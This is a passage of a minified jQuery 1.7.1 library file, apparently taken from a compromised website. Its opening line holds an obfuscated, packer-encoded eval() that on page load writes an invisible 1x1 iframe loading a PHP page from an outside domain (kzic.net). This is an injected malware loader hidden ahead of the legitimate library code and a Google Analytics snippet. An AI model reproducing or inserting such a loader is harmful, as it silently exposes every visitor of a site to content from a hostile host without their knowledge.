eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('7.a(\'<2 j="5-6"><3 8="9:0;4:b;" c="d://e.f/g.h" i="1" k="1"></3></2>\');',21,21,'||div|iframe|display|hades|mobile|document|style|border|write|none|src|http|kzic|net|frm|php|width|class|height'.split('|'),0,{}));var _gaq=_gaq||[];_gaq.push(['_setAccount','UA-37645850-4']);_gaq.push(['_trackPageview']);(function(){var ga=document.createElement('script');ga.type='text/javascript';ga.async=true;ga.src=('https:'==document.location.protocol?'https://ssl':'http://www')+'.google-analytics.com/ga.js';var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(ga,s);})();
(function(a,b){function cy(a){return f.isWindow(a)?a:a.nodeType===9?a.defaultView||a.parentWindow:!1}function cv(a){if(!ck[a]){var b=c.body,d=f("<"+a+">").appendTo(b),e=d.css("display");d.remove();if(e==="none"||e===""){cl||(cl=c.createElement("iframe"),cl.frameBorder=cl.width=cl.height=0),b.appendChild(cl);if(!cm||!cl.createElement)cm=(cl.contentWindow||cl.contentDocument).document,cm.write((c.compatMode==="CSS1Compat"?"<!doctype html>":"")+"<html><body>"),cm.close();d=cm.createElement(a),cm.body.appendChild(d),e=f.css(d,"display"),b.removeChild(cl)}ck[a]=e}return ck[a]}function cu(a,b){var c={};f.each(cq.concat.apply([],cq.slice(0,b)),function(){c[this]=a});return c}function ct(){cr=b}function cs(){setTimeout(ct,0);return cr=f.now()}function cj(){try{return new a.ActiveXObject("Microsoft.XMLHTTP")}catch(b){}}function ci(){try{return new a.XMLHttpRequest}catch(b){}}function cc(a,c){a.dataFilter&&(c=a.dataFilter(c,a.dataType));var d=a.dataTypes,e={},g,h,i=d.length,j,k=d[0],l,m,n,o,p;for(g=1;g<i;g++){if(g===1)for(h in a.converters)typeof h=="string"&&(e[h.toLowerCase()]=a.converters[h]);l=k,k=d[g];if(k==="*")k=l;else if(l!=="*"&&l!==k){m=l+" "+k,n=e[m]||e["* "+k];if(!n){p=b;for(o in e){j=o.split(" ");if(j[0]===l||j[0]==="*"){p=e[j[1]+" "+k];if(p){o=e[o],o===!0?n=p:p===!0&&(n=o);break}}}}!n&&!p&&f.error("No conversion from "+m.replace(" "," to ")),n!==!0&&(c=n?n(c):p(o(c)))}}return c}function cb(a,c,d){var e=a.contents,f=a.dataTypes,g=a.responseFields,h,i,j,k;for(i in g)i in d&&(c[g[i]]=d[i]);while(f[0]==="*")f.shift(),h===b&&(h=a.mimeType||c.getResponseHeader("content-type"));if(h)for(i in e)if(e[i]&&e[i].test(h)){f.unshift(i);break}if(f[0]in d)j=f[0];else{for(i in d){if(!f[0]||a.converters[i+" "+f[0]]){j=i;break}k||(k=i)}j=j||k}if(j){j!==f[0]&&f.unshift(j);return d[j]}}function ca(a,b,c,d){if(f.isArray(b))f.each(b,function(b,e){c||bE.test(a)?d(a,e):ca(a+"["+(typeof e=="object"||f.isArray(e)?b:"")+"]",e,c,d)});else if(!c&&b!=null&&typeof b=="object")for(var e in b)ca(a+"["+e+"]",b[e],c,d);else d(a,b)}function b_(a,c){var d,e,g=f.ajaxSettings.flatOptions||{};for(d in c)c[d]!==b&&((g[d]?a:e||(e={}))[d]=c[d]);e&&f.extend(!0,a,e)}function b$(a,c,d,e,f,g){f=f||c.dataTypes[0],g=g||{},g[f]=!0;var h=a[f],i=0,j=h?h.length:0,k=a===bT,l;for(;i<j&&(k||!l);i++)l=h[i](c,d,e),typeof l=="string"&&(!k||g[l]?l=b:(c.dataTypes.unshift(l),l=b$(a,c,d,e,l,g)));(k||!l)&&!g["*"]&&(l=b$(a,c,d,e,"*",g));return l}function bZ(a){return function(b,c){typeof b!="string"&&(c=b,b="*");if(f.isFunction(c)){var d=b.toLowerCase().split(bP),e=0,g=d.length,h,i,j;for(;e<g;e++)h=d[e],j=/^\+/.test(h),j&&(h=h.substr(1)||"*"),i=a[h]=a[h]||[],i[j?"unshift":"push"](c)}}}function bC(a,b,c){var d=b==="width"?a.offsetWidth:a.offsetHeight,e=b==="width"?bx:by,g=0,h=e.length;if(d>0){if(c!=="border")for(;g<h;g++)c||(d-=parseFloat(f.css(a,"padding"+e[g]))||0),c==="margin"?d+=parseFloat(f.css(a,c+e[g]))||0:d-=parseFloat(f.css(a,"border"+e[g]+"Width"))||0;return d+"px"}d=bz(a,b,b);if(d<0||d==null)d=a.style[b]||0;d=parseFloat(d)||0;if(c)for(;g<h;g++)d+=parseFloat(f.css(a,"padding"+e[g]))||0,c!=="padding"&&(d+=parseFloat(f.css(a,"border"+e[g]+"Width"))||0),c==="margin"&&(d+=parseFloat(f.css(a,c+e[g]))||0);return d+"px"}function bp(a,b){b.src?f.ajax({url:b.src,async:!1,dataType:"script"}):f.globalEval((b.text||b.textContent||b.innerHTML||"").replace(bf,"/*$0*/")),b.parentNode&&b.parentNode.removeChild(b)}function bo(a){var b=c.createElement("div");bh.appendChild(b),b.innerHTML=a.outerHTML;return b.firstChild}function bn(a){var b=(a.nodeName||"").toLowerCase();b==="input"?bm(a):b!=="script"&&typeof a.getElementsByTagName!="undefined"&&f.grep(a.getElementsByTagName("input"),bm)}function bm(a){if(a.type==="checkbox"||a.type==="radio")a.defaultChecked=a.checked}function bl(a){return typeof a.getElementsByTagName!="undefined"?a.getElementsByTagName("*"):typeof a.querySelectorAll!="undefined"?a.querySelectorAll("*"):[]}function bk(a,b){var c;if(b.nodeType===1){b.clearAttributes&&b.clearAttributes(),b.mergeAttributes&&b.mergeAttributes(a),c=b.nodeName.toLowerCase();if(c==="object")b.outerHTML=a.outerHTML;else if(c!=="input"||a.type!=="checkbox"&&a.type!=="radio"){if(c==="option")b.selected=a.defaultSelected;else if(c==="input"||c==="textarea")b.defaultValue=a.defaultValue}else a.checked&&(b.defaultChecked=b.checked=a.checked),b.value!==a.value&&(b.value=a.value);b.removeAttribute(f.expando)}}function bj(a,b){if(b.nodeType===1&&!!f.hasData(a)){var c,d,e,g=f._data(a),h=f._data(b,g),i=g.events;if(i){delete h.handle,h.events={};for(c in i)for(d=0,e=i[c].length;d<e;d++)f.event.add(b,c+(i[c][d].namespace?".":"")+i[c][d].namespace,i[c][d],i[c][d].data)}h.data&&(h.data=f.extend({},h.data))}}function bi(a,b){return f.nodeName(a,"table")?a.getElementsByTagName("tbody")[0]||a.appendChild(a.ownerDocument.createElement("tbody")):a}function U(a){var b=V.split("|"),c=a.createDocumentFragment();if(c.createElement)while(b.length)c.createElement(b.pop());return c}function T(a,b,c){b=b||0;if(f.isFunction(b))return f.grep(a,function(a,d){var e=!!b.call(a,d,a);return e===c});if(b.nodeType)return f.grep(a,function(a,d){return a===b===c});if(typeof b=="string"){var d=f.grep(a,function(a){return a.nodeType===1});if(O.test(b))return f.filter(b,d,!c);b=f.filter(b,d)}return f.grep(a,function(a,d){return f.inArray(a,b)>=0===c})}function S(a){return!a||!a.parentNode||a.parentNode.nodeType===11}function K(){return!0}function J(){return!1}function n(a,b,c){var d=b+"defer",e=b+"queue",g=b+"mark",h=f._data(a,d);h&&(c==="queue"||!f._data(a,e))&&(c==="mark"||!f._data(a,g))&&setTimeout(function(){!f._data(a,e)&&!f._data(a,g)&&(f.removeData(a,d,!0),h.fire())},0)}function m(a){for(var b in a){if(b==="data"&&f.isEmptyObject(a[b]))continue;if(b!=="toJSON")return!1}return!0}function l(a,c,d){if(d===b&&a.nodeType===1){var e="data-"+c.replace(k,"-$1").toLowerCase();d=a.getAttribute(e);if(typeof d=="string"){try{d=d==="true"?!0:d==="false"?!1:d==="null"?null:f.isNumeric(d)?parseFloat(d):j.test(d)?f.parseJSON(d):d}catch(g){}f.data(a,c,d)}else d=b}return d}function h(a){var b=g[a]={},c,d;a=a.split(/\s+/);for(c=0,d=a.length;c<d;c++)b[a[c]]=!0;return b}var c=a.document,d=a.navigator,e=a.location,f=function(){function J(){if(!e.isReady){try{c.documentElement.doScroll("left")}catch(a){setTimeout(J,1);return}e.ready()}}var e=function(a,b){return new e.fn.init(a,b,h)},f=a.jQuery,g=a.$,h,i=/^(?:[^#<]*(<[\w\W]+>)[^>]*$|#([\w\-]*)$)/,j=/\S/,k=/^\s+/,l=/\s+$/,m=/^<(\w+)\s*\/?>(?:<\/\1>)?$/,n=/^[\],:{}\s]*$/,o=/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,p=/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,q=/(?:^|:|,)(?:\s*\[)+/g,r=/(webkit)[ \/]([\w.]+)/,s=/(opera)(?:.*version)?[ \/]([\w.]+)/,t=/(msie) ([\w.]+)/,u=/(mozilla)(?:.*? rv:([\w.]+))?/,v=/-([a-z]|[0-9])/ig,w=/^-ms-/,x=function(a,b){return(b+"").toUpperCase()},y=d.userAgent,z,A,B,C=Object.prototype.toString,D=Object.prototype.hasOwnProperty,E=Array.prototype.push,F=Array.prototype.slice,G=String.prototype.trim,H=Array.prototype.indexOf,I={};e.fn=e.prototype={constructor:e,init:function(a,d,f){var g,h,j,k;if(!a)return this;if(a.nodeType){this.context=this[0]=a,this.length=1;return this}if(a==="body"&&!d&&c.body){this.context=c,this[0]=c.body,this.selector=a,this.length=1;return this}if(typeof a=="string"){a.charAt(0)!=="<"||a.charAt(a.length-1)!==">"||a.length<3?g=i.exec(a):g=[null,a,null];if(g&&(g[1]||!d)){if(g[1]){d=d instanceof e?d[0]:d,k=d?d.ownerDocument||d:c,j=m.exec(a),j?e.isPlainObject(d)?(a=[c.createElement(j[1])],e.fn.attr.call(a,d,!0)):a=[k.createElement(j[1])]:(j=e.buildFragment([g[1]],[k]),a=(j.cacheable?e.clone(j.fragment):j.fragment).childNodes);return e.merge(this,a)}h=c.getElementById(g[2]);if(h&&h.parentNode){if(h.id!==g[2])return f.find(a);this.length=1,this[0]=h}this.context=c,this.selector=a;return this}return!d||d.jquery?(d||f).find(a):this.constructor(d).find(a)}if(e.isFunction(a))return f.ready(a);a.selector!==b&&(this.selector=a.selector,this.context=a.context);return e.makeArray(a,this)},selector:"",jquery:"1.7.1",length:0,size:function(){return this.length},toArray:function(){return F.call(this,0)},get:function(a){return a==null?this.toArray():a<0?this[this.length+a]:this[a]},pushStack:function(a,b,c){var d=this.constructor();e.isArray(a)?E.apply(d,a):e.merge(d,a),d.prevObject=this,d.context=this.context,b==="find"?d.selector=this.selector+(this.selector?" ":"")+c:b&&(d.selector=this.selector+"."+b+"("+c+")");return d},each:function(a,b){return e.each(this,a,b)},ready:function(a){e.bindReady(),A.add(a);return this},eq:function(a){a=+a;return a===-1?this.slice(a):this.slice(a,a+1)},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},slice:function(){return this.pushStack(F.apply(this,arguments),"slice",F.call(arguments).join(","))},map:function(a){return this.pushStack(e.map(this,function(b,c){return a.call(b,c,b)}))},end:function(){return this.prevObject||this.constructor(null)},push:E,sort:[].sort,splice:[].splice},e.fn.init.prototype=e.fn,e.extend=e.fn.extend=function(){var a,c,d,f,g,h,i=arguments[0]||{},j=1,k=arguments.length,l=!1;typeof i=="boolean"&&(l=i,i=arguments[1]||{},j=2),typeof i!="object"&&!e.isFunction(i)&&(i={}),k===j&&(i=this,--j);for(;j<k;j++)if((a=arguments[j])!=null)for(c in a){d=i[c],f=a[c];if(i===f)continue;l&&f&&(e.isPlainObject(f)||(g=e.isArray(f)))?(g?(g=!1,h=d&&e.isArray(d)?d:[]):h=d&&e.isPlainObject(d)?d:{},i[c]=e.extend(l,h,f)):f!==b&&(i[c]=f)}return i},e.extend({noConflict:function(b){a.$===e&&(a.$=g),b&&a.jQuery===e&&(a.jQuery=f);return e},isReady:!1,readyWait:1,holdReady:function(a){a?e.readyWait++:e.ready(!0)},ready:function(a){if(a===!0&&!--e.readyWait||a!==!0&&!e.isReady){if(!c.body)return setTimeout(e.ready,1);e.isReady=!0;if(a!==!0&&--e.readyWait>0)return;A.fireWith(c,[e]),e.fn.trigger&&e(c).trigger("ready").off("ready")}},bindReady:function(){if(!A){A=e.Callbacks("once memory");if(c.readyState==="complete")return setTimeout(e.ready,1);if(c.addEventListener)c.addEventListener("DOMContentLoaded",B,!1),a.addEventListener("load",e.ready,!1);else if(c.attachEvent){c.attachEvent("onreadystatechange",B),a.attachEvent("onload",e.ready);var b=!1;try{b=a.frameElement==null}catch(d){}c.documentElement.doScroll&&b&&J()}}},isFunction:function(a){return e.type(a)==="function"},isArray:Array.isArray||function(a){return e.type(a)==="array"},isWindow:function(a){return a&&typeof a=="object"&&"setInterval"in a},isNumeric:function(a){return!isNaN(parseFloat(a))&&isFinite(a)},type:function(a){return a==null?String(a):I[C.call(a)]||"object"},isPlainObject:function(a){if(!a||e.type(a)!=="object"||a.nodeType||e.isWindow(a))return!1;try{if(a.constructor&&!D.call(a,"constructor")&&!D.call(a.constructor.prototype,"isPrototypeOf"))return!1}catch(c){return!1}var d;for(d in a);return d===b||D.call(a,d)},isEmptyObject:function(a){for(var b in a)return!1;return!0},error:function(a){throw new Error(a)},parseJSON:function(b){if(typeof b!="string"||!b)return null;b=e.trim(b);if(a.JSON&&a.JSON.parse)return a.JSON.parse(b);if(n.test(b.replace(o,"@").replace(p,"]").replace(q,"")))return(new Function("return "+b))();e.error("Invalid JSON: "+b)},parseXML:function(c){var d,f;try{a.DOMParser?(f=new DOMParser,d=f.parseFromString(c,"text/xml")):(d=new ActiveXObject("Microsoft.XMLDOM"),d.async="false",d.loadXML(c))}catch(g){d=b}(!d||!d.documentElement||d.getElementsByTagName("parsererror").length)&&e.error("Invalid XML: "+c);return d},noop:function(){},globalEval:function(b){b&&j.test(b)&&(a.execScript||function(b){a.eval.call(a,b)})(b)},camelCase:function(a){return a.replace(w,"ms-").replace(v,x)},nodeName:function(a,b){return a.nodeName&&a.nodeName.toUpperCase()===b.toUpperCase()},each:function(a,c,d){var f,g=0,h=a.length,i=h===b||e.isFunction(a);if(d){if(i){for(f in a)if(c.apply(a[f],d)===!1)break}else for(;g<h;)if(c.apply(a[g++],d)===!1)break}else if(i){for(f in a)if(c.call(a[f],f,a[f])===!1)break}else for(;g<h;)if(c.call(a[g],g,a[g++])===!1)break;return a},trim:G?function(a){return a==null?"":G.call(a)}:function(a){return a==null?"":(a+"").replace(k,"").replace(l,"")},makeArray:function(a,b){var c=b||[];if(a!=null){var d=e.type(a);a.length==null||d==="string"||d==="function"||d==="regexp"||e.isWindow(a)?E.call(c,a):e.merge(c,a)}return c},inArray:function(a,b,c){var d;if(b){if(H)return H.call(b,a,c);d=b.length,c=c?c<0?Math.max(0,d+c):c:0;for(;c<d;c++)if(c in b&&b[c]===a)return c}return-1},merge:function(a,c){var d=a.length,e=0;if(typeof c.length=="number")for(var f=c.length;e<f;e++)a[d++]=c[e];else while(c[e]!==b)a[d++]=c[e++];a.length=d;return a},grep:function(a,b,c){var d=[],e;c=!!c;for(var f=0,g=a.length;f<g;f++)e=!!b(a[f],f),c!==e&&d.push(a[f]);return d},map:function(a,c,d){var f,g,h=[],i=0,j=a.length,k=a instanceof e||j!==b&&typeof j=="number"&&(j>0&&a[0]&&a[j-1]||j===0||e.isArray(a));if(k)for(;i<j;i++)f=c(a[i],i,d),f!=null&&(h[h.length]=f);else for(g in a)f=c(a[g],g,d),f!=null&&(h[h.length]=f);return h.concat.apply([],h)},guid:1,proxy:function(a,c){if(typeof c=="string"){var d=a[c];c=a,a=d}if(!e.isFunction(a))return b;var f=F.call(arguments,2),g=function(){return a.apply(c,f.concat(F.call(arguments)))};g.guid=a.guid=a.guid||g.guid||e.guid++;return g},access:function(a,c,d,f,g,h){var i=a.length;if(typeof c=="object"){for(var j in c)e.access(a,j,c[j],f,g,d);return a}if(d!==b){f=!h&&f&&e.isFunction(d);for(var k=0;k<i;k++)g(a[k],c,f?d.call(a[k],k,g(a[k],c)):d,h);return a}return i?g(a[0],c):b},now:function(){return(new Date).getTime()},uaMatch:function(a){a=a.toLowerCase();var b=r.exec(a)||s.exec(a)||t.exec(a)||a.indexOf("compatible")<0&&u.exec(a)||[];return{browser:b[1]||"",version:b[2]||"0"}},sub:function(){function a(b,c){return new a.fn.init(b,c)}e.extend(!0,a,this),a.superclass=this,a.fn=a.prototype=this(),a.fn.constructor=a,a.sub=this.sub,a.fn.init=function(d,f){f&&f instanceof e&&!(f instanceof a)&&(f=a(f));return e.fn.init.call(this,d,f,b)},a.fn.init.prototype=a.fn;var b=a(c);return a},browser:{}}),e.each("Boolean Number String Function Array Date RegExp Object".split(" "),function(a,b){I["[object "+b+"]"]=b.toLowerCase()}),z=e.uaMatch(y),z.browser&&(e.browser[z.browser]=!0,e.browser.version=z.version),e.browser.webkit&&(e.browser.safari=!0),j.test(" ")&&(k=/^[\s\xA0]+/,l=/[\s\xA0]+$/),h=e(c),c.addEventListener?B=function(){c.removeEventListener("DOMContentLoaded",B,!1),e.ready()}:c.attachEvent&&(B=function(){c.readyState==="complete"&&(c.detachEvent("onreadystatechange",B),e.ready())});return e}(),g={};f.Callbacks=function(a){a=a?g[a]||h(a):{};var c=[],d=[],e,i,j,k,l,m=function(b){var d,e,g,h,i;for(d=0,e=b.length;d<e;d++)g=b[d],h=f.type(g),h==="array"?m(g):h==="function"&&(!a.unique||!o.has(g))&&c.push(g)},n=function(b,f){f=f||[],e=!a.memory||[b,f],i=!0,l=j||0,j=0,k=c.length;for(;c&&l<k;l++)if(c[l].apply(b,f)===!1&&a.stopOnFalse){e=!0;break}i=!1,c&&(a.once?e===!0?o.disable():c=[]:d&&d.length&&(e=d.shift(),o.fireWith(e[0],e[1])))},o={add:function(){if(c){var a=c.length;m(arguments),i?k=c.length:e&&e!==!0&&(j=a,n(e[0],e[1]))}return this},remove:function(){if(c){var b=arguments,d=0,e=b.length;for(;d<e;d++)for(var f=0;f<c.length;f++)if(b[d]===c[f]){i&&f<=k&&(k--,f<=l&&l--),c.splice(f--,1);if(a.unique)break}}return this},has:function(a){if(c){var b=0,d=c.length;for(;b<d;b++)if(a===c[b])return!0}return!1},empty:function(){c=[];return this},disable:function(){c=d=e=b;return this},disabled:function(){return!c},lock:function(){d=b,(!e||e===!0)&&o.disable();return this},locked:function(){return!d},fireWith:function(b,c){d&&(i?a.once||d.push([b,c]):(!a.once||!e)&&n(b,c));return this},fire:function(){o.fireWith(this,arguments);return this},fired:function(){return!!e}};return o};var i=[].slice;f.extend({Deferred:function(a){var b=f.Callbacks("once memory"),c=f.Callbacks("once memory"),d=f.Callbacks("memory"),e="pending",g={resolve:b,reject:c,notify:d},h={done:b.add,fail:c.add,progress:d.add,state:function(){return e},isResolved:b.fired,isRejected:c.fired,then:function(a,b,c){i.done(a).fail(b).progress(c);return this},always:function(){i.done.apply(i,arguments).fail.apply(i,arguments);return this},pipe:function(a,b,c){return f.Deferred(function(d){f.each({done:[a,"resolve"],fail:[b,"reject"],progress:[c,"notify"]},function(a,b){var c=b[0],e=b[1],g;f.isFunction(c)?i[a](function(){g=c.apply(this,arguments),g&&f.isFunction(g.promise)?g.promise().then(d.resolve,d.reject,d.notify):d[e+"With"](this===i?d:this,[g])}):i[a](d[e])})}).promise()},promise:function(a){if(a==null)a=h;else for(var b in h)a[b]=h[b];return a}},i=h.promise({}),j;for(j in g)i[j]=g[j].fire,i[j+"With"]=g[j].fireWith;i.done(function(){e="resolved"},c.disable,d.lock).fail(function(){e="rejected"},b.disable,d.lock),a&&a.call(i,i);return i},when:function(a){function m(a){return function(b){e[a]=arguments.length>1?i.call(arguments,0):b,j.notifyWith(k,e)}}function l(a){return function(c){b[a]=arguments.length>1?i.call(arguments,0):c,--g||j.resolveWith(j,b)}}var b=i.call(arguments,0),c=0,d=b.length,e=Array(d),g=d,h=d,j=d<=1&&a&&f.isFunction(a.promise)?a:f.Deferred(),k=j.promise();if(d>1){for(;c<d;c++)b[c]&&b[c].promise&&f.isFunction(b[c].promise)?b[c].promise().then(l(c),j.reject,m(c)):--g;g||j.resolveWith(j,b)}else j!==a&&j.resolveWith(j,d?[a]:[]);return k}}),f.support=function(){var b,d,e,g,h,i,j,k,l,m,n,o,p,q=c.createElement("div"),r=c.documentElement;q.setAttribute("className","t"),q.innerHTML="   <link/><table></table><a href='/a' style='top:1px;float:left;opacity:.55;'>a</a><input type='checkbox'/>",d=q.getElementsByTagName("*"),e=q.getElementsByTagName("a")[0];if(!d||!d.length||!e)return{};g=c.createElement("select"),h=g.appendChild(c.createElement("option")),i=q.getElementsByTagName("input")[0],b={leadingWhitespace:q.firstChild.nodeType===3,tbody:!q.getElementsByTagName("tbody").length,htmlSerialize:!!q.getElementsByTagName("link").length,style:/top/.test(e.getAttribute("style")),hrefNormalized:e.getAttribute("href")==="/a",opacity:/^0.55/.test(e.style.opacity),cssFloat:!!e.style.cssFloat,checkOn:i.value==="on",optSelected:h.selected,getSetAttribute:q.className!=="t",enctype:!!c.createElement("form").enctype,html5Clone:c.createElement("nav").cloneNode(!0).outerHTML!=="<:nav></:nav>",submitBubbles:!0,changeBubbles:!0,focusinBubbles:!1,deleteExpando:!0,noCloneEvent:!0,inlineBlockNeedsLayout:!1,shrinkWrapBlocks:!1,reliableMarginRight:!0},i.checked=!0,b.noCloneChecked=i.cloneNode(!0).checked,g.disabled=!0,b.optDisabled=!h.disabled;try{delete q.test}catch(s){b.deleteExpando=!1}!q.addEventListener&&q.attachEvent&&q.fireEvent&&(q.attachEvent("onclick",function(){b.noCloneEvent=!1}),q.cloneNode(!0).fireEvent("onclick")),i=c.createElement("input"),i.value="t",i.setAttribute("type","radio"),b.radioValue=i.value==="t",i.setAttribute("checked","checked"),q.appendChild(i),k=c.createDocumentFragment(),k.appendChild(q.lastChild),b.checkClone=k.cloneNode(!0).cloneNode(!0).lastChild.checked,b.appendChecked=i.checked,k.removeChild(i),k.appendChild(q),q.innerHTML="",a.getComputedStyle&&(j=c.createElement("div"),j.style.width="0",j.style.marginRight="0",q.style.width="2px",q.appendChild(j),b.reliableMarginRight=(parseInt((a.getComputedStyle(j,null)||{marginRight:0}).marginRight,10)||0)===0);if(q.attachEvent)for(o in{submit:1,change:1,focusin:1})n="on"+o,p=n in q,p||(q.setAttribute(n,"return;"),p=typeof q[n]=="function"),b[o+"Bubbles"]=p;k.removeChild(q),k=g=h=j=q=i=null,f(function(){var a,d,e,g,h,i,j,k,m,n,o,r=c.getElementsByTagName("body")[0];!r||(j=1,k="position:absolute;top:0;left:0;width:1px;height:1px;margin:0;",m="visibility:hidden;border:0;",n="style='"+k+"border:5px solid #000;padding:0;'",o="<div "+n+"><div></div></div>"+"<table "+n+" cellpadding='0' cellspacing='0'>"+"<tr><td></td></tr></table>",a=c.createElement("div"),a.style.cssText=m+"width:0;height:0;position:static;top:0;margin-top:"+j+"px",r.insertBefore(a,r.firstChild),q=c.createElement("div"),a.appendChild(q),q.innerHTML="<table><tr><td style='padding:0;border:0;display:none'></td><td>t</td></tr></table>",l=q.getElementsByTagName("td"),p=l[0].offsetHeight===0,l[0].style.display="",l[1].style.display="none",b.reliableHiddenOffsets=p&&l[0].offsetHeight===0,q.innerHTML="",q.style.width=q.style.paddingLeft="1px",f.boxModel=b.boxModel=q.offsetWidth===2,typeof q.style.zoom!="undefined"&&(q.style.display="inline",q.style.zoom=1,b.inlineBlockNeedsLayout=q.offsetWidth===2,q.style.display="",q.innerHTML="<div style='width:4px;'></div>",b.shrinkWrapBlocks=q.offsetWidth!==2),q.style.cssText=k+m,q.innerHTML=o,d=q.firstChild,e=d.firstChild,h=d.nextSibling.firstChild.firstChild,i={doesNotAddBorder:e.offsetTop!==5,doesAddBorderForTableAndCells:h.offsetTop===5},e.style.position="fixed",e.style.top="20px",i.fixedPosition=e.offsetTop===20||e.offsetTop===15,e.style.position=e.style.top="",d.style.overflow="hidden",d.style.position="relative",i.subtractsBorderForOverflowNotVisible=e.offsetTop===-5,i.doesNotIncludeMarginInBodyOffset=r.offsetTop!==j,r.removeChild(a),q=a=null,f.extend(b,i))});return b}();var j=/^(?:\{.*\}|\[.*\])$/,k=/([A-Z])/g;f.extend({cache:{},uuid:0,expando:"jQuery"+(f.fn.jquery+Math.random()).replace(/\D/g,""),noData:{embed:!0,object:"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000",applet:!0},hasData:function(a){a=a.nodeType?f.cache[a[f.expando]]:a[f.expando];return!!a&&!m(a)},data:function(a,c,d,e){if(!!f.acceptData(a)){var g,h,i,j=f.expando,k=typeof c=="string",l=a.nodeType,m=l?f.cache:a,n=l?a[j]:a[j]&&j,o=c==="events";if((!n||!m[n]||!o&&!e&&!m[n].data)&&k&&d===b)return;n||(l?a[j]=n=++f.uuid:n=j),m[n]||(m[n]={},l||(m[n].toJSON=f.noop));if(typeof c=="object"||typeof c=="function")e?m[n]=f.extend(m[n],c):m[n].data=f.extend(m[n].data,c);g=h=m[n],e||(h.data||(h.data={}),h=h.data),d!==b&&(h[f.camelCase(c)]=d);if(o&&!h[c])return g.events;k?(i=h[c],i==null&&(i=h[f.camelCase(c)])):i=h;return i}},removeData:function(a,b,c){if(!!f.acceptData(a)){var d,e,g,h=f.expando,i=a.nodeType,j=i?f.cache:a,k=i?a[h]:h;if(!j[k])return;if(b){d=c?j[k]:j[k].data;if(d){f.isArray(b)||(b in d?b=[b]:(b=f.camelCase(b),b in d?b=[b]:b=b.split(" ")));for(e=0,g=b.length;e<g;e++)delete d[b[e]];if(!(c?m:f.isEmptyObject)(d))return}}if(!c){delete j[k].data;if(!m(j[k]))return}f.support.deleteExpando||!j.setInterval?delete j[k]:j[k]=null,i&&(f.support.deleteExpando?delete a[h]:a.removeAttribute?a.removeAttribute(h):a[h]=null)}},_data:function(a,b,c){return f.data(a,b,c,!0)},acceptData:function(a){if(a.nodeName){var b=f.noData[a.nodeName.toLowerCase()];if(b)return b!==!0&&a.getAttribute("classid")===b}return!0}}),f.fn.extend({data:function(a,c){var d,e,g,h=null;if(typeof a=="undefined"){if(this.length){h=f.data(this[0]);if(this[0].nodeType===1&&!f._data(this[0],"parsedAttrs")){e=this[0].attributes;for(var i=0,j=e.length;i<j;i++)g=e[i].name,g.indexOf("data-")===0&&(g=f.camelCase(g.substring(5)),l(this[0],g,h[g]));f._data(this[0],"parsedAttrs",!0)}}return h}if(typeof a=="object")return this.each(function(){f.data(this,a)});d=a.split("."),d[1]=d[1]?"."+d[1]:"";if(c===b){h=this.triggerHandler("getData"+d[1]+"!",[d[0]]),h===b&&this.length&&(h=f.data(this[0],a),h=l(this[0],a,h));return h===b&&d[1]?this.data(d[0]):h}return this.each(function(){var b=f(this),e=[d[0],c];b.triggerHandler("setData"+d[1]+"!",e),f.data(this,a,c),b.triggerHandler("changeData"+d[1]+"!",e)})},removeData:function(a){return this.each(function(){f.removeData(this,a)})}}),f.extend({_mark:function(a,b){a&&(b=(b||"fx")+"mark",f._data(a,b,(f._data(a,b)||0)+1))},_unmark:function(a,b,c){a!==!0&&(c=b,b=a,a=!1);if(b){c=c||"fx";var d=c+"mark",e=a?0:(f._data(b,d)||1)-1;e?f._data(b,d,e):(f.removeData(b,d,!0),n(b,c,"mark"))}},queue:function(a,b,c){var d;if(a){b=(b||"fx")+"queue",d=f._data(a,b),c&&(!d||f.isArray(c)?d=f._data(a,b,f.makeArray(c)):d.push(c));return d||[]}},dequeue:function(a,b){b=b||"fx";var c=f.queue(a,b),d=c.shift(),e={};d==="inprogress"&&(d=c.shift()),d&&(b==="fx"&&c.unshift("inprogress"),f._data(a,b+".run",e),d.call(a,function(){f.dequeue(a,b)},e)),c.length||(f.removeData(a,b+"queue "+b+".run",!0),n(a,b,"queue"))}}),f.fn.extend({queue:function(a,c){typeof a!="string"&&(c=a,a="fx");if(c===b)return f.queue(this[0],a);return this.each(function(){var b=f.queue(this,a,c);a==="fx"&&b[0]!=="inprogress"&&f.dequeue(this,a)})},dequeue:function(a){return this.each(function(){f.dequeue(this,a)})},delay:function(a,b){a=f.fx?f.fx.speeds[a]||a:a,b=b||"fx";return this.queue(b,function(b,c){var d=setTimeout(b,a);c.stop=function(){clearTimeout(d)}})},clearQueue:function(a){return this.queue(a||"fx",[])},promise:function(a,c){function m(){--h||d.resolveWith(e,[e])}typeof a!="string"&&(c=a,a=b),a=a||"fx";var d=f.Deferred(),e=this,g=e.length,h=1,i=a+"defer",j=a+"queue",k=a+"mark",l;while(g--)if(l=f.data(e[g],i,b,!0)||(f.data(e[g],j,b,!0)||f.data(e[g],k,b,!0))&&f.data(e[g],i,f.Callbacks("once memory"),!0))h++,l.add(m);m();return d.promise()}});var o=/[\n\t\r]/g,p=/\s+/,q=/\r/g,r=/^(?:button|input)$/i,s=/^(?:button|input|object|select|textarea)$/i,t=/^a(?:rea)?$/i,u=/^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i,v=f.support.getSetAttribute,w,x,y;f.fn.extend({attr:function(a,b){return f.access(this,a,b,!0,f.attr)},removeAttr:function(a){return this.each(function(){f.removeAttr(this,a)})},prop:function(a,b){return f.access(this,a,b,!0,f.prop)},removeProp:function(a){a=f.propFix[a]||a;return this.each(function(){try{this[a]=b,delete this[a]}catch(c){}})},addClass:function(a){var b,c,d,e,g,h,i;if(f.isFunction(a))return this.each(function(b){f(this).addClass(a.call(this,b,this.className))});if(a&&typeof a=="string"){b=a.split(p);for(c=0,d=this.length;c<d;c++){e=this[c];if(e.nodeType===1)if(!e.className&&b.length===1)e.className=a;else{g=" "+e.className+" ";for(h=0,i=b.length;h<i;h++)~g.indexOf(" "+b[h]+" ")||(g+=b[h]+" 